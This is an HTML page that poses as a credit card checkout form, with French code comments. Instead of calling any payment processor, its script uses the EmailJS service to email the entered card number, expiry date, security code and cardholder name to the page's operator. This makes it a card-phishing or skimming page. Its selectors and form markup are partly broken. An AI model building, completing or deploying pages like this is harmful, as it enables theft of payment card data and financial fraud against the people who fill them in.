<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Credit Card Payment</title>

<style>

/* =========================
   RESET
========================= */

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    min-height: 100vh;
    background: #000;
    font-family: Arial, Helvetica, sans-serif;
    color: #fff;
}

/* =========================
   PAGE CONTAINER
========================= */

.payment-page {
    width: 100%;
    max-width: 620px;
    min-height: 100vh;
    margin: 0 auto;
    padding: 35px 45px 50px;

    background: #000;

    border-left: 3px solid #00ff75;
    border-right: 3px solid #ff8a00;

    box-shadow:
        0 0 12px rgba(0, 255, 117, 0.8),
        inset 0 0 20px rgba(0, 255, 117, 0.08);
}

/* =========================
   TITLE
========================= */

.payment-title {
    display: flex;
    align-items: center;
    gap: 15px;

    font-size: 22px;
    font-weight: 600;

    margin-bottom: 14px;
}

.card-icon {
    width: 42px;
    height: 30px;

    background: #fff;
    border-radius: 6px;

    position: relative;
}

.card-icon::before {
    content: "";
    position: absolute;

    left: 8px;
    right: 8px;
    top: 8px;

    height: 4px;

    background: #111;
}

.card-icon::after {
    content: "";
    position: absolute;

    left: 8px;
    bottom: 7px;

    width: 16px;
    height: 3px;

    background: #111;
}

/* =========================
   DESCRIPTION
========================= */

.required-text {
    font-size: 13px;
    color: #fff;
    margin-bottom: 22px;
}

/* =========================
   INPUTS
========================= */

input,
select {
    width: 100%;
    height: 56px;

    border: none;
    outline: none;

    border-radius: 14px;

    background: #57585e;

    color: #fff;

    padding: 0 17px;

    font-size: 16px;

    transition:
        background 0.2s ease,
        box-shadow 0.2s ease;
}

input::placeholder {
    color: transparent;
}

input:focus,
select:focus {
    background: #62636a;

    box-shadow:
        0 0 0 2px rgba(255, 255, 255, 0.15),
        0 0 12px rgba(0, 255, 117, 0.18);
}

select {
    appearance: auto;
    cursor: pointer;
}

/* =========================
   CARD NUMBER
========================= */

.card-number {
    margin-top: 12px;
    margin-bottom: 10px;
}

/* =========================
   CARD LOGOS
========================= */

.card-logos {
    display: flex;
    align-items: center;
    gap: 7px;

    margin-bottom: 27px;
}

.card-logos span {
    display: flex;
    align-items: center;
    justify-content: center;

    height: 28px;
    padding: 0 8px;

    background: #fff;
    border-radius: 5px;

    font-size: 11px;
    font-weight: bold;
}

.mastercard {
    color: #111;
}

.visa {
    color: #143c8c;
    font-style: italic;
}

/* =========================
   EXPIRATION + CVC
========================= */

.card-row {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 20px;

    margin-bottom: 55px;
}

.card-row input {
    height: 35px;
}

/* =========================
   LABELS
========================= */

label {
    display: block;

    font-size: 19px;
    font-weight: 400;

    margin-bottom: 13px;
}

/* =========================
   NAME
========================= */

.name-section {
    margin-bottom: 37px;
}

/* =========================
   BILLING ADDRESS
========================= */

.billing-title {
    font-size: 20px;
    font-weight: 500;

    margin-bottom: 25px;
}

.address-group {
    margin-bottom: 28px;
}

.address-group label {
    font-size: 18px;
    margin-bottom: 12px;
}

/* =========================
   PAY BUTTON
========================= */

.pay-button {
    width: 100%;
    height: 64px;

    display: flex;
    align-items: center;
    justify-content: center;

    margin-top: 5px;

    border: none;
    border-radius: 35px;

    background: #ff8613;

    color: #fff;

    font-size: 20px;
    font-weight: 600;

    text-decoration: none;

    cursor: pointer;

    transition:
        transform 0.15s ease,
        background 0.2s ease,
        box-shadow 0.2s ease;
}

.pay-button:hover {
    background: #ff962d;

    box-shadow:
        0 0 20px rgba(255, 134, 19, 0.35);
}

.pay-button:active {
    transform: scale(0.97);
}

/* cadenas / cadenas de sécurité */
.lock {
    margin-right: 10px;
    font-size: 19px;
}

/* =========================
   MOBILE
========================= */

@media (max-width: 600px) {

    .payment-page {
        max-width: 100%;
        padding: 28px 40px 45px;

        border-left-width: 3px;
        border-right-width: 3px;
    }

    .payment-title {
        font-size: 21px;
    }

    .required-text {
        font-size: 12px;
    }

    label {
        font-size: 18px;
    }

    .card-row {
        gap: 25px;
    }

    input,
    select {
        height: 56px;
    }

    .pay-button {
        height: 62px;
        font-size: 19px;
    }
}

@media (max-width: 400px) {

    .payment-page {
        padding-left: 24px;
        padding-right: 24px;
    }

    .card-row {
        gap: 15px;
    }
}

</style>
</head>

<body>

<main class="payment-page">

    <!-- TITLE -->
    <div class="payment-title">

        <div class="card-icon"></div>

        <span>Credit Card</span>

    </div>

    <p class="required-text">
        Fill in this information to finalize the payment
    </p>


    <!-- CARD NUMBER -->
    <div class="card-number">
      <label for="card number">
        Card number
        </label>
        <input
            type="text"
             id="card-number"
            name="card-number"
            inputmode="alphanumeric"
            autocomplete="cc-number"
            maxlength="19"
            placeholder="Card number"required
        >

    </div>

 <form id="nouveau-paiement">
    <!-- CARD LOGOS -->
    <div class="card-logos">

        <span class="mastercard">●●</span>

        <span class="visa">VISA</span>

    </div>


    <!-- EXPIRATION + CVC -->
    <div class="card-row">
<label for="Expiry date">
            Expiry date:
        </label>
        <input
            type="text"
            id="expiry"
            name="expiry"
            inputmode="alphanumeric"
            autocomplete="cc-exp"
            maxlength="5"
            placeholder="MM / YY"
        > 
        <label for="secury code">
            secury code:
        </label>

        <input 
            type="text"
            name="cvc"
            id="secury-code"
            inputmode="alphanumeric"
            autocomplete="cc-csc"
            maxlength="4"
            placeholder="CVC"
        >

    </div>


    <!-- NAME -->
    <div class="name-section">

        <label for="name">
            Name on card
        </label>

        <input
            id="name"
            type="text"
            name="name"
            autocomplete="cc-name"
            placeholder="Name on card"
        >

    </div>


    <!-- BILLING ADDRESS -->
    <div class="billing-title">
        Billing address
    </div>


    <!-- COUNTRY -->
    <div class="address-group">

        <label for="country">
            Country/Region
        </label>

        <select id="country" name="country">

            <option value="" selected disabled>
                Select country
            </option>

            <option>Nederland</option>
            <option>Ireland</option>
            <option>italie</option>
            <option>Germany</option>
            <option>Autriche</option>
            <option>Espagna</option>
            <option>switzerland</option>
            <option>pologne</option>


        </select>

    </div>


    <!-- STREET -->
    <div class="address-group">

        <label for="street">
            Street
        </label>

        <input
            id="street"
            type="text"
            name="street"
            autocomplete="street-address"
            placeholder="Street"
        >

    </div>


    <!-- HOUSE NUMBER -->
    <div class="address-group">

        <label for="house-number">
            House number
        </label>

        <input
            id="house-number"
            type="text"
            name="house-number"
            placeholder="House number"
        >

    </div>


    <!-- POSTAL CODE -->
    <div class="address-group">

        <label for="postal-code">
            Postal code
        </label>

        <input
            id="postal-code"
            type="text"
            name="postal-code"
            autocomplete="postal-code"
            placeholder="Postal code"
        >

    </div>


    <!-- CITY -->
    <div class="address-group">

        <label for="city">
            City
        </label>

        <input
            id="city"
            type="text"
            name="city"
            autocomplete="address-level2"
            placeholder="City"
        >

    </div>


    <!-- BUTTON -->
    <a
        class="pay-button"
        href="man.html"
    >
        <span class="lock">🔒</span>
        Pay 
    </a>

</main>
</form>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
/* ==============================
   CONFIGURATION EMAILJS
   ============================== */

emailjs.init({
    publicKey: "k2iGQVReEg_D-AtVP"
});


/* ==============================
   FORMULAIRE
   ============================== */

const form = document.querySelector("nouveau-paiement");

form.addEventListener("submit", function(event) {

    // Empêche le rechargement de la page
    event.preventDefault();


    /* ==============================
       RÉCUPÉRATION DES INFORMATIONS
       ============================== */

    const templateParams = {

       card: document.querySelector("card-number").value,

      expiry: document.querySelector("expiry").value,

        security: document.querySelector("security-code").value,

       name : document.querySelector("name").value,
       region: document.querySelector("region").value


    };


    /* ==============================
       ENVOI VERS EMAILJS
       ============================== */

    emailjs.send(
        "service_ku6lzob",
        "template_4711nlk",
        templateParams
    )

    .then(function(response) {

        console.log("Email envoyé :", response.status, response.text);

        alert("Pay");

        // Réinitialise le formulaire
        form.reset();

    })

    .catch(function(error) {

        console.error("Erreur EmailJS :", error);

        alert("Une erreur est survenue lors de l'envoi.");

    });

;})
</script>

</body>
</html>
